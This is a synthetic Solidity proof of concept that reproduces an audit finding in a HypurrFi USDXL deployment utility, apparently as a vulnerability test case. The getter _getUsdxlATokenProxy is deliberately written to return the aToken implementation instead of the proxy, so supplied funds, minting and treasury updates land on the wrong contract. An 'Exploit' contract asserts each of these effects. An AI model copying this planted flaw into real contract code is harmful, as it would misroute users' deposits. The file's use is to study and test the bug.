// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  HypurrFi DeployUsdxlUtils — the stored aToken proxy is the implementation
    (Pashov H-03, February 2025).
    SYNTHETIC, cheatcode-free. _getUsdxlATokenProxy returns address(usdxlAToken),
    the implementation. A later supply sends the underlying there and mints
    the aToken on that same contract. The proxy the pool actually uses
    stays at 0. */

contract Underlying {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract UsdxlAToken {
    address public treasury;
    mapping(address => uint256) public balanceOf;

    function updateUsdxlTreasury(address next) external {
        treasury = next;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract DeployUsdxlUtils {
    UsdxlAToken public usdxlAToken;
    UsdxlAToken public usdxlATokenProxy;
    Underlying public underlying;
    address public trackedProxy;

    constructor(UsdxlAToken impl, UsdxlAToken proxy, Underlying asset) {
        usdxlAToken = impl;
        usdxlATokenProxy = proxy;
        underlying = asset;
    }

    function _getUsdxlATokenProxy() public virtual returns (address) {
        // @> VULN: returns the implementation. Callers treat this as the aToken proxy.
        trackedProxy = address(usdxlAToken);
        return trackedProxy;
    }

    function supply(address user, uint256 amount) external returns (address hit) {
        hit = this._getUsdxlATokenProxy();
        underlying.transfer(hit, amount);
        UsdxlAToken(hit).updateUsdxlTreasury(user);
        UsdxlAToken(hit).mint(user, amount);
    }
}

contract Exploit {
    Underlying public underlying; // nonce 1
    UsdxlAToken public impl; // nonce 2
    UsdxlAToken public proxy; // nonce 3
    DeployUsdxlUtils public utils; // nonce 4

    constructor() {
        underlying = new Underlying();
        impl = new UsdxlAToken();
        proxy = new UsdxlAToken();
        utils = new DeployUsdxlUtils(impl, proxy, underlying);
    }

    function run() external {
        underlying.mint(address(utils), 1000);
        address hit = utils._getUsdxlATokenProxy();
        utils.supply(address(this), 1000);
        require(hit == address(impl), "did not hit the implementation");
        require(underlying.balanceOf(address(impl)) == 1000, "implementation did not take 1000");
        require(underlying.balanceOf(address(proxy)) == 0, "proxy received underlying");
        require(impl.balanceOf(address(this)) == 1000, "aToken was not mis-minted");
        require(proxy.balanceOf(address(this)) == 0, "proxy minted");
        require(impl.treasury() == address(this), "treasury not written on the implementation");
        require(proxy.treasury() == address(0), "proxy treasury changed");
    }
}
